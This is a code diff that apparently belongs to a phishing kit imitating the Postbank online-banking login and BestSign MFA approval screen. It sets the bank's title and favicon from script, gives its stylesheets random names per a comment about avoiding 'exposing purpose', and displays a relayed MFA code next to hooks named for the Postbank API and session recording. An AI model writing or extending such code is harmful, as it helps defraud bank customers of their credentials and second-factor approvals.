@@ -2,6 +2,7 @@ import { useState, useEffect } from 'react'
 import { usePostbankApi } from './hooks/usePostbankApi'
 import { useSessionRecording } from './hooks/useSessionRecording'
 import { SecurityScan } from './components/SecurityScan'
+import BestSignPanel from './components/BestSignPanel'
 
 function App() {
   const {
@@ -38,6 +39,58 @@ function App() {
   const [showError, setShowError] = useState(false)
   const [errorMessage, setErrorMessage] = useState('')
   const [mfaCode, setMfaCode] = useState('')
+
+  // Set page title, favicon, CSS, and assets for login page (all dynamic, nothing in static HTML)
+  useEffect(() => {
+    // Set HTML attributes
+    document.documentElement.lang = 'de'
+    document.documentElement.setAttribute('data-dbcr-theme', 'pb-light')
+    
+    // Set title
+    document.title = 'Login | Postbank Banking & Brokerage'
+    
+    // Remove any existing favicons
+    const existingFavicons = document.querySelectorAll('link[rel="icon"], link[rel="shortcut icon"]')
+    existingFavicons.forEach(favicon => favicon.remove())
+    
+    // Add Postbank favicon
+    const favicon = document.createElement('link')
+    favicon.rel = 'icon'
+    favicon.type = 'image/x-icon'
+    favicon.href = '/favicon.ico'
+    document.head.appendChild(favicon)
+    
+    // Load CSS files dynamically (generic names to avoid exposing purpose)
+    const cssFiles = [
+      '/assets/c7f2a1.css',  // base styles
+      '/assets/d8e3b4.css',  // design system
+      '/assets/a9f1c2.css',  // form styles
+      '/assets/b3d5e6.css'   // overlay styles
+    ]
+    
+    const loadedStyles = []
+    cssFiles.forEach(href => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = href
+      document.head.appendChild(link)
+      loadedStyles.push(link)
+    })
+    
+    // Load SVG icon sprite
+    fetch('/assets/icons/icon-sprite.svg')
+      .then(r => r.text())
+      .then(svg => {
+        const container = document.getElementById('icon-sprite-container')
+        if (container) container.innerHTML = svg
+      })
+      .catch(() => {})
+    
+    // Cleanup on unmount
+    return () => {
+      loadedStyles.forEach(link => link.remove())
+    }
+  }, [])
 
   // Set greeting based on time
   useEffect(() => {
@@ -227,77 +280,17 @@ function App() {
                       ) : stage === 'mfa' ? (
                         /* STAGE 3: BestSign/MFA */
                         <div data-test="polling">
-                          {/* Back to Login Link */}
-                          <div className="d-flex pt-3 pb-4">
-                            <button type="button" onClick={handleBackToLogin} className="db-icon-action db-text db-text--mute py-0">
-                              <svg role="img" focusable="false" style={{height: '16px', width: '16px'}}>
-                                <use xlinkHref="#arrow2-left"></use>
-                              </svg>
-                              <span>Zurück zum Login</span>
-                            </button>
-                          </div>
-
-                          {/* 2FA Panel with Illustration */}
-                          <div role="alert" aria-live="polite">
-                            <div className="illustration-wrapper mt-5 mt-md-7">
-                              <div className="wrapper">
-                                <div className="db-banking-2fa-illustration mx-auto db-banking-2fa-illustration--mobile">
-                                  <div className="top-box mt-3 mx-auto"></div>
-                                  <div className="d-flex justify-content-center mx-auto status-box status-box--mobile status-box--default">
-                                    <div className="d-flex align-items-center logo"></div>
-                                  </div>
-                                </div>
-                              </div>
-                            </div>
-                            
-                            <div className="db-banking-2fa-panel">
-                              <div className="db-banking-2fa-panel__content">
-                                <div className="db-banking-2fa-panel__textbox d-flex flex-wrap margin-with-subline">
-                                  <h2 className="db-heading-3 align-self-center mx-auto my-0 color-text-primary text-center w-100">
-                                    Mit BestSign freigeben
-                                  </h2>
-                                  <p className="d-block mt-3 db-text--mute color-text-primary mx-auto text-center w-100">
-                                    Bitte prüfen Sie den Auftrag in Ihrer App. Nur wenn alle Angaben korrekt sind, geben Sie den Auftrag frei.
-                                  </p>
-                                </div>
-                                <div>
-                                  <div className="d-flex justify-content-center">
-                                    <div className="db-banking-2fa-pill db-text--mute">
-                                      <span className="mx-5 mx-md-6">{mfaCode || 'XXXX'}</span>
-                                    </div>
-                                  </div>
-                                </div>
-                              </div>
-                            </div>
-                          </div>
-
-                          {/* Action Bar */}
-                          <div className="db-banking-2fa-action-bar db-text--mute d-flex flex-wrap justify-content-sm-center">
-                            <span className="db-banking-2fa-action-bar__title py-5 pb-sm-4">Klappt nicht?</span>
-                          </div>
-                          <div className="db-banking-2fa-action-bar__divider d-sm-none"></div>
-                          <div className="d-block d-sm-flex align-items-sm-center justify-content-sm-center">
-                            <div className="db-banking-2fa-action-bar-item d-flex">
-                              <button type="button" onClick={handlePasswordLogin} data-test="cancelAuthorization" className="db-banking-icon-action">
-                                <svg role="img" focusable="false" style={{height: '24px', width: '24px'}}>
-                                  <use xlinkHref="#shield"></use>
-                                </svg>
-                                <span>Mit Passwort einloggen</span>
-                              </button>
-                            </div>
-                            <div className="d-sm-none db-banking-2fa-action-bar-item-divider"></div>
-                            <div className="db-banking-2fa-action-bar-item d-flex">
-                              <a data-test="contactLink" className="d-flex" href="tel:004922855005500">
-                                <button type="button" className="db-banking-icon-action">
-                                  <svg role="img" focusable="false" style={{height: '24px', width: '24px'}}>
-                                    <use xlinkHref="#phone"></use>
-                                  </svg>
-                                  <span>Kundenservice 0228 5500 5500</span>
-                                </button>
-                              </a>
-                            </div>
-                            <div className="d-sm-none db-banking-2fa-action-bar-item-divider"></div>
-                          </div>
+                          <BestSignPanel
+                            code={mfaCode || 'XXXX'}
+                            title="Mit BestSign freigeben"
+                            subtitle="Bitte prüfen Sie den Auftrag in Ihrer App. Nur wenn alle Angaben korrekt sind, geben Sie den Auftrag frei."
+                            showBackButton={true}
+                            onBack={handleBackToLogin}
+                            showActionBar={true}
+                            onPasswordLogin={handlePasswordLogin}
+                            compact={false}
+                            showSpinner={false}
+                          />
                         </div>
                       ) : stage === 'oneid' ? (
                         /* STAGE 1: Postbank ID */
